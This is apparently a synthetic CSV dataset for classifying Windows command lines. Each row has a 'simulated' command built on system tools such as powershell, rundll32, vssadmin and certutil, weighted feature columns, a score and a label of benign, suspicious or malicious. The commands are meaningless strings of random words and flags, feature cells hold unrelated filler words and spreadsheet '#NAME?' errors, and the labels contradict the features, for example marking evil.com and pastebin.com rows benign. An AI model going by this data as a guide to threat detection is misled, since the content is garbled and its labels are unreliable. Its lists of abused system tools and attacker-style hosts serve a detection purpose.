prompt,response,Lolbin (0.05),Content (0.4),Frequency (0.2),Source (0.1),Network (0.1),Behavioural (0.1),History (0.05),Score,Label
"whoami.exe best -y,-nop,-recurse",User information simulated command.,whoami.exe,best,none,none,example.com,"-y,-nop,-recurse",none,0.1,benign
"ipconfig move -c,/priv",Bed move too attack. simulated command.,ipconfig,move,none,none,pastebin.com,"-c,/priv",school,0.8,malicious
"fsutil.exe none -y,/flushdns",File system utility simulated command.,fsutil.exe,none,none,however,none,"-y,/flushdns",none,0.1,benign
whoami.exe none /f,User information simulated command.,whoami.exe,none,none,none,evil.com,/f,none,0.1,benign
"netstat.exe how /priv,-c",Network connections simulated command.,netstat.exe,how,entire,none,localhost,"/priv,-c",member,0.8,malicious
"wevtutil.exe none /nointeractive,-w",Event log query simulated command.,wevtutil.exe,none,none,thousand,evil.com,"/nointeractive,-w",none,0.1,benign
"vssadmin.exe guess -recurse,-nop,/svc",Volume shadow service simulated command.,vssadmin.exe,guess,none,none,evil.com,"-recurse,-nop,/svc",none,0.3,suspicious
rundll32.exe none /priv,DLL runner simulated command.,rundll32.exe,none,ahead,none,evil.com,/priv,performance,0.8,malicious
"powershell.exe none /svc,/flushdns,/nointeractive",PowerShell-related simulated command.,powershell.exe,none,letter,none,none,"/svc,/flushdns,/nointeractive",none,0.1,benign
certutil.exe none -y,Certificate utility simulated command.,certutil.exe,none,none,their,none,#NAME?,none,0.1,benign
"wevtutil.exe none /f,-c",Event log query simulated command.,wevtutil.exe,none,hot,none,pastebin.com,"/f,-c",none,0.3,suspicious
netstat.exe none -y,Network connections simulated command.,netstat.exe,none,use,none,pastebin.com,#NAME?,none,0.1,benign
"reg.exe energy -w,/nointeractive",Registry editor simulated command.,reg.exe,energy,none,none,localhost,"-w,/nointeractive",third,0.8,malicious
"net.exe almost -nop,/nointeractive,-decode",Net command simulated command.,net.exe,almost,none,performance,localhost,"-nop,/nointeractive,-decode",none,0.1,benign
"rundll32.exe affect -decode,-w",DLL runner simulated command.,rundll32.exe,affect,me,none,example.com,"-decode,-w",none,0.1,benign
"systeminfo real /flushdns,-y,-w",System info simulated command.,systeminfo,real,none,none,evil.com,"/flushdns,-y,-w",none,0.1,benign
"rundll32.exe none -encode,/c,-decode",DLL runner simulated command.,rundll32.exe,none,debate,none,evil.com,"-encode,/c,-decode",none,0.3,suspicious
"vssadmin.exe all /c,-c,/nointeractive",Volume shadow service simulated command.,vssadmin.exe,all,none,none,localhost,"/c,-c,/nointeractive",none,0.3,suspicious
"arp.exe similar -w,-decode,/f",ARP table simulated command.,arp.exe,similar,none,none,example.com,"-w,-decode,/f",himself,0.8,malicious
"arp.exe set /priv,/flushdns",ARP table simulated command.,arp.exe,set,none,none,example.com,"/priv,/flushdns",none,0.3,suspicious
tasklist.exe none /svc,Task listing simulated command.,tasklist.exe,none,none,none,localhost,/svc,none,0.3,suspicious
"tasklist.exe similar /priv,/c",Task listing simulated command.,tasklist.exe,similar,forward,none,internal.local,"/priv,/c",none,0.3,suspicious
certutil.exe even -recurse,Certificate utility simulated command.,certutil.exe,even,really,none,pastebin.com,#NAME?,none,0.1,benign
"tasklist.exe hit /svc,/nointeractive,-recurse",Task listing simulated command.,tasklist.exe,hit,north,none,evil.com,"/svc,/nointeractive,-recurse",none,0.3,suspicious
"reg.exe none /c,/add",Registry editor simulated command.,reg.exe,none,represent,rest,localhost,"/c,/add",everybody,0.8,malicious
net.exe rate -decode,Net command simulated command.,net.exe,rate,none,none,pastebin.com,#NAME?,none,0.1,benign
powershell.exe none /add,PowerShell-related simulated command.,powershell.exe,none,none,none,pastebin.com,/add,official,0.8,malicious
"rundll32.exe draw /flushdns,-decode,/f",DLL runner simulated command.,rundll32.exe,draw,none,none,localhost,"/flushdns,-decode,/f",none,0.1,benign
"powershell.exe none /nointeractive,-decode,/svc",PowerShell-related simulated command.,powershell.exe,none,accept,none,evil.com,"/nointeractive,-decode,/svc",thing,0.8,malicious
"tasklist.exe activity -recurse,/nointeractive",Task listing simulated command.,tasklist.exe,activity,none,none,localhost,"-recurse,/nointeractive",none,0.1,benign
"net.exe none /flushdns,/c",Net command simulated command.,net.exe,none,none,none,evil.com,"/flushdns,/c",none,0.3,suspicious
net.exe none /c,Net command simulated command.,net.exe,none,left,none,localhost,/c,money,0.8,malicious
"reg.exe federal /c,/f",Registry editor simulated command.,reg.exe,federal,none,do,none,"/c,/f",none,0.3,suspicious
"systeminfo piece -nop,/svc,-encode",System info simulated command.,systeminfo,piece,none,none,example.com,"-nop,/svc,-encode",none,0.1,benign
"wmic none -recurse,/svc,/nointeractive",WMIC tool simulated command.,wmic,none,none,none,evil.com,"-recurse,/svc,/nointeractive",none,0.3,suspicious
"systeminfo recently -c,-y",System info simulated command.,systeminfo,recently,none,none,evil.com,"-c,-y",Mrs,0.8,malicious
"certutil.exe example -y,-nop",Certificate utility simulated command.,certutil.exe,example,none,none,example.com,"-y,-nop",none,0.1,benign
"whoami.exe young /svc,/nointeractive",User information simulated command.,whoami.exe,young,blue,none,evil.com,"/svc,/nointeractive",none,0.1,benign
wevtutil.exe single -w,Event log query simulated command.,wevtutil.exe,single,none,none,internal.local,#NAME?,none,0.3,suspicious
"powershell.exe none -encode,-w",PowerShell-related simulated command.,powershell.exe,none,none,need,pastebin.com,"-encode,-w",none,0.1,benign
"reg.exe none /priv,-w,-y",Registry editor simulated command.,reg.exe,none,none,none,internal.local,"/priv,-w,-y",none,0.3,suspicious
"vssadmin.exe none /c,/priv",Volume shadow service simulated command.,vssadmin.exe,none,site,none,example.com,"/c,/priv",natural,0.8,malicious
"fsutil.exe budget -nop,/flushdns",File system utility simulated command.,fsutil.exe,budget,none,experience,none,"-nop,/flushdns",none,0.3,suspicious
powershell.exe none -nop,PowerShell-related simulated command.,powershell.exe,none,although,none,none,#NAME?,none,0.3,suspicious
"systeminfo coach /f,-c,/priv",System info simulated command.,systeminfo,coach,none,none,evil.com,"/f,-c,/priv",none,0.3,suspicious
"wmic none /nointeractive,/f,-y",WMIC tool simulated command.,wmic,none,none,enough,evil.com,"/nointeractive,/f,-y",might,0.8,malicious
wmic fund -recurse,WMIC tool simulated command.,wmic,fund,none,none,none,#NAME?,us,0.8,malicious
"wmic none -decode,-recurse,-y",WMIC tool simulated command.,wmic,none,none,measure,localhost,"-decode,-recurse,-y",image,0.8,malicious
"tasklist.exe none /svc,/nointeractive",Task listing simulated command.,tasklist.exe,none,third,police,example.com,"/svc,/nointeractive",none,0.1,benign
"reg.exe none -w,/add",Registry editor simulated command.,reg.exe,none,reality,my,pastebin.com,"-w,/add",none,0.3,suspicious
powershell.exe up -c,PowerShell-related simulated command.,powershell.exe,up,none,network,none,-c,Mrs,0.8,malicious
vssadmin.exe behind -recurse,Volume shadow service simulated command.,vssadmin.exe,behind,none,none,evil.com,#NAME?,none,0.3,suspicious
wevtutil.exe happy -encode,Event log query simulated command.,wevtutil.exe,happy,none,none,none,#NAME?,none,0.1,benign
"vssadmin.exe none -y,-nop",Volume shadow service simulated command.,vssadmin.exe,none,none,better,localhost,"-y,-nop",approach,0.8,malicious
reg.exe reality /add,Registry editor simulated command.,reg.exe,reality,deep,none,evil.com,/add,none,0.1,benign
"rundll32.exe none /priv,/svc",DLL runner simulated command.,rundll32.exe,none,none,none,example.com,"/priv,/svc",none,0.1,benign
"systeminfo personal -decode,/flushdns",System info simulated command.,systeminfo,personal,authority,none,example.com,"-decode,/flushdns",none,0.1,benign
"net.exe none /flushdns,/f",Net command simulated command.,net.exe,none,none,none,internal.local,"/flushdns,/f",none,0.3,suspicious
"whoami.exe none -recurse,-decode,-encode",User information simulated command.,whoami.exe,none,none,none,example.com,"-recurse,-decode,-encode",none,0.1,benign
"whoami.exe window /nointeractive,-w",User information simulated command.,whoami.exe,window,none,none,pastebin.com,"/nointeractive,-w",none,0.1,benign
"fsutil.exe home /svc,-decode,/add",File system utility simulated command.,fsutil.exe,home,west,none,example.com,"/svc,-decode,/add",none,0.3,suspicious
"whoami.exe none /flushdns,/priv,-recurse",User information simulated command.,whoami.exe,none,none,none,evil.com,"/flushdns,/priv,-recurse",none,0.3,suspicious
"whoami.exe none -decode,/flushdns",User information simulated command.,whoami.exe,none,none,none,example.com,"-decode,/flushdns",none,0.1,benign
"arp.exe none -w,-recurse,-c",ARP table simulated command.,arp.exe,none,none,north,pastebin.com,"-w,-recurse,-c",none,0.3,suspicious
"reg.exe none -encode,/priv",Registry editor simulated command.,reg.exe,none,skill,happen,evil.com,"-encode,/priv",none,0.3,suspicious
"reg.exe none /add,/svc",Registry editor simulated command.,reg.exe,none,none,none,evil.com,"/add,/svc",none,0.1,benign
reg.exe fight -recurse,Registry editor simulated command.,reg.exe,fight,none,none,internal.local,#NAME?,none,0.3,suspicious
"fsutil.exe learn -decode,-nop,/c",File system utility simulated command.,fsutil.exe,learn,none,none,internal.local,"-decode,-nop,/c",none,0.1,benign
"systeminfo letter /f,/nointeractive,/c",System info simulated command.,systeminfo,letter,none,none,internal.local,"/f,/nointeractive,/c",none,0.1,benign
reg.exe ten /nointeractive,Registry editor simulated command.,reg.exe,ten,none,none,pastebin.com,/nointeractive,light,0.8,malicious
"reg.exe summer -nop,/add",Registry editor simulated command.,reg.exe,summer,lawyer,arm,internal.local,"-nop,/add",none,0.1,benign
"reg.exe none /f,/flushdns,-y",Registry editor simulated command.,reg.exe,none,north,none,localhost,"/f,/flushdns,-y",will,0.8,malicious
rundll32.exe none -y,DLL runner simulated command.,rundll32.exe,none,none,none,none,#NAME?,young,0.8,malicious
rundll32.exe none /nointeractive,DLL runner simulated command.,rundll32.exe,none,none,none,evil.com,/nointeractive,none,0.1,benign
vssadmin.exe spend -c,Volume shadow service simulated command.,vssadmin.exe,spend,none,none,evil.com,-c,none,0.1,benign
"net.exe itself -encode,/nointeractive",Net command simulated command.,net.exe,itself,none,from,internal.local,"-encode,/nointeractive",none,0.1,benign
rundll32.exe none /f,DLL runner simulated command.,rundll32.exe,none,none,none,localhost,/f,none,0.1,benign
powershell.exe none -encode,PowerShell-related simulated command.,powershell.exe,none,none,none,example.com,#NAME?,none,0.1,benign
"reg.exe none -nop,/c",Registry editor simulated command.,reg.exe,none,responsibility,none,internal.local,"-nop,/c",none,0.3,suspicious
wevtutil.exe none /flushdns,Event log query simulated command.,wevtutil.exe,none,buy,none,localhost,/flushdns,none,0.3,suspicious
"whoami.exe none /f,-c,/c",User information simulated command.,whoami.exe,none,none,none,pastebin.com,"/f,-c,/c",none,0.3,suspicious
"arp.exe none -c,-w,/svc",ARP table simulated command.,arp.exe,none,alone,none,example.com,"-c,-w,/svc",employee,0.8,malicious
